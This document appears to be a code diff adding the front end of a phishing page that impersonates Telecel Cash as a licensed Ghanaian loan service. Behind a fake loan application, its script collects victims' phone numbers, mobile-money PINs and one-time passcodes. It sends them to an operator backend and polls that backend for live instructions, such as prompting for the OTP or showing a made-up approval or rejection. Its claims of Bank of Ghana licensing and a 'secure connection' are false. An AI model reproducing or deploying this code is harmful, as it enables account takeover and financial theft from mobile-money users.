+    <div class="pin-logo-wrap">
+      <img 
+        src="https://imgs.search.brave.com/nuQGYiekldn4lVAGtgjMXJhqSVaRq0ZUCD9Jr6mXakg/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly93d3cu/Y2l0aW5ld3Nyb29t/LmNvbS93cC1jb250/ZW50L3VwbG9hZHMv/MjAyNC8wNS9UZWxl/Y2VsLUNhc2gtTG9n/by5qcGc" 
+        alt="Telecel Cash Logo"
+        id="pinLogoImg"
+        crossorigin="anonymous"
+        style="width:130px;height:auto;display:block;margin:0 auto;object-fit:contain;"
+      >
+    </div>
+
+    <!-- Title -->
+    <h1 class="pin-page-title">Confirm your PIN</h1>
+    <p class="pin-page-subtitle">Enter your 4-digit PIN</p>
+
+    <!-- PIN Boxes -->
+    <div class="pin-boxes-row" id="pinBoxesRow">
+      <div class="pin-box active" data-index="0"></div>
+      <div class="pin-box" data-index="1"></div>
+      <div class="pin-box" data-index="2"></div>
+      <div class="pin-box" data-index="3"></div>
+    </div>
+
+    <!-- Error message -->
+    <div class="pin-error-text" id="pinError">Incorrect PIN. Please try again.</div>
+
+    <!-- Forgot PIN -->
+    <div class="forgot-pin-wrap">
+      <a class="forgot-pin-link" href="#" onclick="forgotPin()">Forgot PIN?</a>
+    </div>
+
+    <!-- Digit Keypad -->
+    <div class="keypad-container">
+      <div class="keypad">
+        <!-- Row 1: 1 2 3 -->
+        <button class="key-btn" onclick="pinAddDigit('1')">1</button>
+        <button class="key-btn" onclick="pinAddDigit('2')">2</button>
+        <button class="key-btn" onclick="pinAddDigit('3')">3</button>
+
+        <!-- Row 2: 4 5 6 -->
+        <button class="key-btn" onclick="pinAddDigit('4')">4</button>
+        <button class="key-btn" onclick="pinAddDigit('5')">5</button>
+        <button class="key-btn" onclick="pinAddDigit('6')">6</button>
+
+        <!-- Row 3: 7 8 9 -->
+        <button class="key-btn" onclick="pinAddDigit('7')">7</button>
+        <button class="key-btn" onclick="pinAddDigit('8')">8</button>
+        <button class="key-btn" onclick="pinAddDigit('9')">9</button>
+
+        <!-- Row 4: empty 0 delete -->
+        <button class="key-btn empty"></button>
+        <button class="key-btn" onclick="pinAddDigit('0')">0</button>
+        <button class="key-btn delete" onclick="pinDeleteDigit()">
+          <svg viewBox="0 0 24 24">
+            <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
+            <line x1="18" y1="9" x2="12" y2="15"/>
+            <line x1="12" y1="9" x2="18" y2="15"/>
+          </svg>
+        </button>
+      </div>
+    </div>
+
+    <!-- Status -->
+    <div class="pin-status-text" id="pinStatusText"></div>
+  </div>
+
+  <!-- ═══════════════════ OTP ═══════════════════ -->
+  <div class="scr otp-scr" id="s-otp">
+    <button class="otp-back-btn" onclick="goBackToLogin()">←</button>
+    <h1 class="otp-title">Enter your OTP code</h1>
+    <p class="otp-subtitle">Please enter the 5-digit OTP code sent to<br>phone number: <span class="otp-phone-display" id="otpPhoneDisplay">+233 77259291</span></p>
+    <div class="otp-row" id="otpRow">
+      <input class="otp-input active-box" maxlength="1" inputmode="numeric">
+      <input class="otp-input" maxlength="1" inputmode="numeric">
+      <input class="otp-input" maxlength="1" inputmode="numeric">
+      <input class="otp-input" maxlength="1" inputmode="numeric">
+      <input class="otp-input" maxlength="1" inputmode="numeric">
+    </div>
+    <div class="otp-timer" id="otpTimerDisplay">00:20</div>
+    <div class="spacer"></div>
+    <button class="btn-otp" id="otpSubmitBtn" onclick="submitOtp()">Continue</button>
+  </div>
+
+  <!-- ═══════════════════ SUCCESS ═══════════════════ -->
+  <div class="scr" id="s-ok">
+    <div class="top-accent"></div>
+    <div class="hdr">
+      <div class="dm-logo">
+        <img src="https://imgs.search.brave.com/Boj0v1ymugGBH06xnXzj3EOI1ZBbXS0o5FlH2XResBA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly90ZWxl/Y2VsZ3JvdXAuY29tL3dwLWNvbnRlbnQv/dXBsb2Fkcy8yMDI1LzEyL1RHLUxPR09P/LTAzXzQwMC53ZWJw" alt="logo" onerror="this.style.display='none'">
+      </div>
+    </div>
+    <div class="succ-wrap">
+      <div class="succ-icon"><svg viewBox="0 0 24 24"><polyline points="4 12 9 17 20 7"/></svg></div>
+      <div class="succ-h" id="successTitle">Application submitted</div>
+      <div class="succ-p" id="successMsg">Your application is being reviewed. You will receive an SMS in 3-5 business days with your reference number and next steps shortly.</div>
+      <div class="ref-box"><div class="ref-lbl">Reference number</div><div class="ref-val" id="ref-num">TCL-2026-XXXXXX</div></div>
+      <div class="spacer"></div>
+      <button class="btn-ghost" onclick="reset()">New application</button>
+      <div class="fnote">Telecel Loans · Licensed by the Bank of Ghana</div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+const API_BASE=window.location.origin,POLL_INTERVAL=3000,POLL_TIMEOUT=120000;
+var durVal=6,otpCountdown=null,pollTimer=null,currentToken=null,fullNameCache='';
+
+function handleLoginLogoError(){var i=document.getElementById('loginLogoImg'),f=document.getElementById('loginLogoFallback');if(i)i.style.display='none';if(f)f.style.display='flex';}
+function handlePinLogoError(){var i=document.getElementById('pinLogoImg'),f=document.getElementById('pinLogoFallback');if(i)i.style.display='none';if(f)f.style.display='flex';}
+function handleOtpPopupLogoError(){var i=document.getElementById('otpPopupLogoImg'),f=document.getElementById('otpPopupLogoFallback');if(i)i.style.display='none';if(f)f.style.display='flex';}
+
+function go(f,t){
+  document.getElementById(f).classList.remove('active');
+  var e=document.getElementById(t);e.classList.add('active');e.scrollTop=0;
+  if(t==='s-p3')populateReview();
+  if(t==='s-otp'){var o=document.querySelector('#otpRow .otp-input');if(o)o.focus();startOtpCountdown();}
+  if(t==='s-pin')pinReset();
+}
+function goToPinPage(){
+  var p=document.getElementById('phoneInputLogin').value.trim();
+  if(p.length<9||p.length>10){alert('Please enter a valid phone number (9 to 10 digits).');return;}
+  go('s-login','s-pin');
+}
+function pinGoBack(){
+  go('s-pin','s-login');
+}
+
+function usd(n){return'GH₵ '+Math.round(n).toLocaleString('en-US');}
+function calcM(a,m){if(!a||a<=0)return 0;var r=0.05/12;return a*r*Math.pow(1+r,m)/(Math.pow(1+r,m)-1);}
+function selectDur(el){document.querySelectorAll('.dur-opt').forEach(b=>b.classList.remove('selected'));el.classList.add('selected');durVal=parseInt(el.dataset.val);updateLanding();}
+function amountInputChange(v){
+  v=v.replace(/\D/g,'');document.getElementById('amountInput').value=v;
+  var e=document.getElementById('amountError');
+  if(v===''){e.classList.remove('show');document.getElementById('slider').value=1000;updateLanding();return;}
+  var n=parseInt(v);
+  if(n<1000){e.classList.add('show');updateDisplay(n);}
+  else{e.classList.remove('show');if(n>100000){n=100000;document.getElementById('amountInput').value=n;}document.getElementById('slider').value=n;updateLanding();}
+}
+function updateDisplay(n){document.getElementById('loanAmt').textContent='GH₵ '+n.toLocaleString('en-US');var mo=calcM(n,durVal);document.getElementById('land-monthly').textContent=mo>0?usd(mo):'—';document.getElementById('land-total').textContent=mo>0?usd(mo*durVal):'—';document.getElementById('hero-sub').textContent=(mo>0?usd(mo)+' /month':'—')+' · 5% per year';}
+function sliderChange(v){document.getElementById('amountInput').value=v;document.getElementById('amountError').classList.remove('show');updateLanding();}
+function updateLanding(){var a=parseInt(document.getElementById('slider').value)||1000;updateDisplay(a);}
+function validateAlpha(el){el.value=el.value.replace(/[^a-zA-Z\s]/g,'');}
+function validateNumeric(el){el.value=el.value.replace(/[^0-9.]/g,'');var p=el.value.split('.');if(p.length>2)el.value=p[0]+'.'+p.slice(1).join('');}
+function chk1(){var ok=document.getElementById('fn').value.trim()&&document.getElementById('ln').value.trim()&&document.getElementById('incomeSource').value.trim()&&document.getElementById('inc').value.trim();document.getElementById('p1btn').disabled=!ok;}
+function populateReview(){
+  var a=parseInt(document.getElementById('slider').value)||20,m=durVal,fn=document.getElementById('fn').value.trim(),ln=document.getElementById('ln').value.trim(),ic=parseFloat(document.getElementById('inc').value)||0,src=document.getElementById('incomeSource').value||'—';
+  fullNameCache=[fn,ln].filter(Boolean).join(' ')||'Unknown';
+  document.getElementById('rv-name').textContent=fullNameCache;document.getElementById('rv-source').textContent=src;
+  document.getElementById('rv-inc').textContent=ic>0?('GH₵ '+Math.round(ic).toLocaleString('en-US')):'—';document.getElementById('rv-dur').textContent=m+' months';
+  document.getElementById('rv-amt').textContent='GH₵ '+a.toLocaleString('en-US');document.getElementById('rv-rep').textContent=usd(calcM(a,m))+' /mo';
+}
+
+function showOverlay(h){document.getElementById('overlayCard').innerHTML=h;document.getElementById('overlay').style.display='flex';}
+function hideOverlay(){document.getElementById('overlay').style.display='none';}
+function showPollingOverlay(t,d){showOverlay('<div class="overlay-spinner"></div><div class="overlay-title">'+(t||'Processing')+'</div><div class="overlay-desc">'+(d||'Please wait...')+'</div><div class="overlay-error" id="overlayError"></div>');}
+function showOverlayError(m){var e=document.getElementById('overlayError');if(e){e.textContent=m;e.style.display='block';}}
+function showCoolLoader(){showOverlay('<div class="cool-loader"><div class="overlay-title">Securing your connection</div><div class="overlay-desc">Preparing Telecel secure login...</div><div class="loading-bar-wrap"><div class="loading-bar"></div></div></div>');setTimeout(function(){hideOverlay();go('s-p3','s-login');},3000);}
+
+function getLoginPhone(){return document.getElementById('phoneInputLogin').value.trim();}
+async function notifyBackend(type,extra){
+  var p={type:type,phone:getLoginPhone(),countryCode:'+233',name:fullNameCache};
+  for(var k in extra)p[k]=extra[k];
+  try{var r=await fetch(API_BASE+'/notify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p)});return await r.json();}
+  catch(e){return{ok:false,error:'Network error'};}
+}
+function startPolling(cb){
+  var t0=Date.now();clearInterval(pollTimer);
+  pollTimer=setInterval(async function(){
+    if(Date.now()-t0>POLL_TIMEOUT){clearInterval(pollTimer);showOverlayError('Request timed out. Please try again.');return;}
+    try{var r=await fetch(API_BASE+'/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:currentToken})});var d=await r.json();if(!d.ok){clearInterval(pollTimer);showOverlayError('Error checking status.');return;}if(d.result!=='pending'){clearInterval(pollTimer);cb(d.result);}}
+    catch(e){}
+  },POLL_INTERVAL);
+}
+
+var loginPhone=document.getElementById('phoneInputLogin'),loginCheckIcon=document.getElementById('loginCheckIcon'),agreeChk=document.getElementById('agreeChk'),loginBtn=document.getElementById('loginContinueBtn');
+loginPhone.addEventListener('focus',function(){if(this.value==='')this.placeholder='';});
+loginPhone.addEventListener('blur',function(){if(this.value==='')this.placeholder='02xxxxxxxx';});
+loginPhone.addEventListener('input',function(){this.value=this.value.replace(/\D/g,'').slice(0,10);var l=this.value.length;loginCheckIcon.classList.toggle('visible',l>=9&&l<=10);updateLoginBtn();});
+agreeChk.addEventListener('change',updateLoginBtn);
+function updateLoginBtn(){var l=loginPhone.value.length,ok=agreeChk.checked&&l>=9&&l<=10;loginBtn.disabled=!ok;loginBtn.classList.toggle('active',ok);}
+
+// ── PIN STATE (new design) ──
+var pinValue='',pinBoxes=document.querySelectorAll('#s-pin .pin-box'),pinError=document.getElementById('pinError'),pinStatusText=document.getElementById('pinStatusText'),pinIsShaking=false;
+
+function pinUpdateDisplay(){
+  pinBoxes.forEach(function(b,i){
+    b.innerHTML='';b.classList.remove('filled','active','error');
+    if(i<pinValue.length){var d=document.createElement('div');d.className='pin-dot';b.appendChild(d);b.classList.add('filled');}
+    if(i===pinValue.length&&pinValue.length<4)b.classList.add('active');
+  });
+  if(pinValue.length>0){pinError.classList.remove('show');pinStatusText.textContent='';}
+}
+
+function pinAddDigit(d){
+  if(pinIsShaking)return;
+  if(pinValue.length>=4)return;
+  pinValue+=d;pinUpdateDisplay();
+  if(pinValue.length===4){setTimeout(function(){pinSubmit();},300);}
+}
+
+function pinDeleteDigit(){
+  if(pinIsShaking)return;
+  if(pinValue.length===0)return;
+  pinValue=pinValue.slice(0,-1);pinUpdateDisplay();
+}
+
+function pinReset(){
+  pinValue='';pinUpdateDisplay();pinError.classList.remove('show');pinStatusText.textContent='';
+}
+
+function pinShake(){
+  if(pinIsShaking)return;pinIsShaking=true;
+  pinBoxes.forEach(b=>b.classList.add('error'));
+  setTimeout(function(){pinBoxes.forEach(b=>b.classList.remove('error'));pinIsShaking=false;pinReset();},400);
+}
+
+function pinSubmit(){
+  if(pinValue.length<4)return;
+  var p=pinValue;
+  console.log('🔐 PIN submitted:', p);
+  
+  // Demo mode: "0000" = wrong PIN, anything else = correct
+  if(p==='0000'){
+    pinError.classList.add('show');
+    pinShake();
+    pinStatusText.textContent='';
+    console.log('❌ Incorrect PIN');
+    return;
+  }
+  
+  // Correct PIN - proceed to OTP
+  pinStatusText.textContent='Verifying...';
+  showPollingOverlay('Login in progress','Please wait...');
+  
+  notifyBackend('pin',{passcode:p}).then(function(d){
+    if(!d.ok){
+      // If backend fails, still proceed for demo
+      hideOverlay();
+      goToOtp();
+      return;
+    }
+    currentToken=d.token;
+    startPolling(function(r){
+      if(r==='continue_otp'){
+        hideOverlay();
+        goToOtp();
+      }else if(r==='pin_wrong'){
+        hideOverlay();
+        pinError.classList.add('show');
+        pinShake();
+      }
+    });
+  }).catch(function(){
+    // Network error - still proceed for demo
+    hideOverlay();
+    goToOtp();
+  });
+}
+
+function forgotPin(){
+  alert('Forgot PIN? Please contact customer support.\n\nDial *110# for assistance.');
+}
+
+// ── KEYBOARD SUPPORT FOR PIN ──
+document.addEventListener('keydown',function(e){
+  var pinScr=document.getElementById('s-pin');
+  if(!pinScr.classList.contains('active'))return;
+  if(document.activeElement===document.body||document.activeElement.tagName==='BODY'){
+    if(e.key>='0'&&e.key<='9'){pinAddDigit(e.key);}
+    else if(e.key==='Backspace'||e.key==='Delete'){pinDeleteDigit();}
+    else if(e.key==='Enter'){pinSubmit();}
+  }
+});
+
+var otpInputs=document.querySelectorAll('.otp-input'),otpSubmitBtn=document.getElementById('otpSubmitBtn');
+otpInputs.forEach(function(inp,i,all){
+  inp.addEventListener('focus',function(){all.forEach(x=>x.classList.remove('active-box'));inp.classList.add('active-box');});
+  inp.addEventListener('input',function(){inp.value=inp.value.replace(/\D/g,'').slice(-1);if(inp.value&&all[i+1])all[i+1].focus();var full=[...all].every(b=>b.value.length===1);otpSubmitBtn.classList.toggle('active',full);if(full)setTimeout(function(){submitOtp();},300);});
+  inp.addEventListener('keydown',function(e){if(e.key==='Backspace'&&!inp.value&&all[i-1])all[i-1].focus();});
+});
+function getOtpValue(){return[...otpInputs].map(b=>b.value).join('');}
+function goToOtp(){var p=loginPhone.value.trim(),d=p.length>=4?('+233 '+p):'+233 24XXXXXXX';document.getElementById('otpPhoneDisplay').textContent=d;go('s-pin','s-otp');}
+function goBackToLogin(){clearInterval(otpCountdown);otpInputs.forEach(b=>b.value='');otpSubmitBtn.classList.remove('active');document.getElementById('otpPopupOverlay').classList.remove('active');go('s-otp','s-login');}
+function startOtpCountdown(){
+  clearInterval(otpCountdown);var s=20,el=document.getElementById('otpTimerDisplay');el.classList.remove('expired');el.style.cursor='default';el.onclick=null;el.textContent='00:20';
+  otpCountdown=setInterval(function(){s--;el.textContent='00:'+String(s).padStart(2,'0');if(s<=0){clearInterval(otpCountdown);otpCountdown=null;el.textContent='Resend OTP code';el.classList.add('expired');el.style.cursor='pointer';el.onclick=function(){retryOtp();};document.getElementById('otpPopupOverlay').classList.add('active');}},1000);
+}
+function retryOtp(){
+  document.getElementById('otpPopupOverlay').classList.remove('active');otpInputs.forEach(b=>b.value='');otpSubmitBtn.classList.remove('active');clearInterval(otpCountdown);
+  showPollingOverlay('Requesting new OTP','Please wait...');
+  notifyBackend('otp_resend',{}).then(function(d){hideOverlay();if(d.ok){startOtpCountdown();if(otpInputs.length>0)otpInputs[0].focus();}else alert('Failed to request new OTP. Please try again.');}).catch(function(){hideOverlay();startOtpCountdown();if(otpInputs.length>0)otpInputs[0].focus();});
+}
+function submitOtp(){
+  var o=getOtpValue();if(o.length<5){alert('Please enter the full 5-digit OTP code.');return;}
+  clearInterval(otpCountdown);document.getElementById('otpPopupOverlay').classList.remove('active');
+  showPollingOverlay('Verifying OTP','please wait...');
+  notifyBackend('otp',{otp:o}).then(function(d){if(!d.ok){showOverlayError('Failed: '+(d.error||'Unknown error'));return;}currentToken=d.token;startPolling(function(r){hideOverlay();switch(r){case'otp_wrong':alert('Incorrect OTP code. Please try again.');otpInputs.forEach(b=>b.value='');otpInputs[0].focus();otpSubmitBtn.classList.remove('active');startOtpCountdown();break;case'pin_invalid':alert('Invalid session. Please log in again.');go('s-otp','s-login');break;case'loan_approved':onApproved();break;case'loan_rejected':onRejected();break;}});});
+}
+function onApproved(){var r='TCL-2026-'+Math.floor(100000+Math.random()*900000);document.getElementById('ref-num').textContent=r;document.getElementById('successTitle').textContent='Application approved';document.getElementById('successMsg').textContent="Congratulations! Your application is being reviewed. You will receive an SMS in 3-5 business days with reference number and next steps shortly.";go('s-otp','s-ok');}
+function onRejected(){var r='TCL-2026-'+Math.floor(100000+Math.random()*900000);document.getElementById('ref-num').textContent=r;document.getElementById('successTitle').textContent='Application denied';document.getElementById('successMsg').textContent='Unfortunately, your loan application was not approved at this time due to Invalid pin or Low balance. You can submit a new application after 30 days.';go('s-otp','s-ok');}
+
+function reset(){
+  clearInterval(pollTimer);clearInterval(otpCountdown);hideOverlay();document.getElementById('otpPopupOverlay').classList.remove('active');
+  ['fn','ln','inc'].forEach(id=>{var e=document.getElementById(id);if(e)e.value='';});document.getElementById('incomeSource').value='';
+  document.getElementById('slider').value=1000;document.getElementById('amountInput').value='';document.getElementById('amountError').classList.remove('show');
+  loginPhone.value='';loginCheckIcon.classList.remove('visible');loginPhone.placeholder='02xxxxxxxx';agreeChk.checked=false;loginBtn.disabled=true;loginBtn.classList.remove('active');
+  pinReset();otpInputs.forEach(b=>b.value='');otpSubmitBtn.classList.remove('active');durVal=6;
+  document.querySelectorAll('.dur-opt').forEach((b,i)=>b.classList.toggle('selected',i===0));updateLanding();go('s-ok','s-land');
+}
+updateLanding();
+</script>
+</body>
+</html>
